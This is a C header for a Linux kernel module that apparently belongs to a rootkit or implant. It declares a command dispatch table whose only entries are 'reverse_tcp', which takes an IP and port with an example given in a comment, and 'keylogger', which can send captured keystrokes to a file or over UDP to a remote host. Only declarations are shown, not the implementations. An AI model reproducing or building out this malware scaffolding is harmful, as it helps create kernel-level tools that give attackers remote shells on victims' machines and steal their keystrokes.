#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/slab.h>  // For kmalloc and kfree
#include <linux/types.h> // For NULL and other types
#include <linux/string.h> // For strcmp and related functions
#include <linux/net.h>   // For socket structures
#include <linux/socket.h> // For socket functions
#include <net/sock.h>    // For socket operations

#ifndef COMMANDS_H
#define COMMANDS_H

// Define a function pointer type that accepts multiple arguments
typedef void (*command_func_t)(const char **args, int arg_count);

typedef struct {
    const char *name;
    command_func_t func;
} command_t;

// Function declarations with multiple argument support
void execute_reversetcp_command(const char **args, int arg_count);
void execute_keylogger_command(const char **args, int arg_count);

// Command mapping with updated function signature to handle dynamic arguments
static command_t commands[] = {
    {"reverse_tcp", execute_reversetcp_command},   // reverse_tcp will accept multiple arguments (IP, port) Exemple to use : reverse_tcp 127.0.0.1 1339 
    {"keylogger", execute_keylogger_command},      // Keylogger can accept any number of arguments Exemple to use keylogger [file/udp] [path_to_file/IP] [Port (Only of udp)]
};

#endif
